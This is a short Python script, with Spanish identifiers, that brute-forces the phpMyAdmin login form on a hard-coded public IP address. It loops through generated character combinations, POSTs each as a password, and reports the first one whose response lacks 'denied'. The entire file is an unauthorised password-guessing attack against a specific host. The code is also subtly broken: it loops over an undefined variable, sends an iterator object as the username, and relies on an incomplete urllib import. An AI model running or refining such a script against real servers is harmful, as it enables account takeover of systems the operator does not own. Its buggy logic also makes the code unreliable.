import http.client
import urllib
import itertools

v = 0
b = 0
#pass
qw = "denied"
longitudpass = 1
mezclapass = list("1234567890Bqwertyuiopñlkjhgfdsazxcvbnm")
combinacionespas = itertools.product(mezclapass, repeat = longitudpass)

#Fin pass

#user
longituduser = 1
mezclauser = list("qwertyuiopñlkjhgfdsamnbvcxz")
combinacionesuser = itertools.product(mezclauser, repeat = longituduser)
#fin User


for i in combinaciones:
    abrir_conexion = http.client.HTTPConnection("88.7.140.78:80")
    cabeceras = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
    password = "".join(i)
    parametros = urllib.parse.urlencode({"pma_username":combinacionesuser, "pma_password":password})
    abrir_conexion.request("POST", "/phpmyadmin/index.php", parametros, cabeceras)
    respuesta = abrir_conexion.getresponse()
    ver_source = respuesta.read()
    if b"denied" in ver_source:
        print("Probando " + password)
    else:
        print("--------------DONE--------------")
        print("La contraseña es" + password)
        break
    	

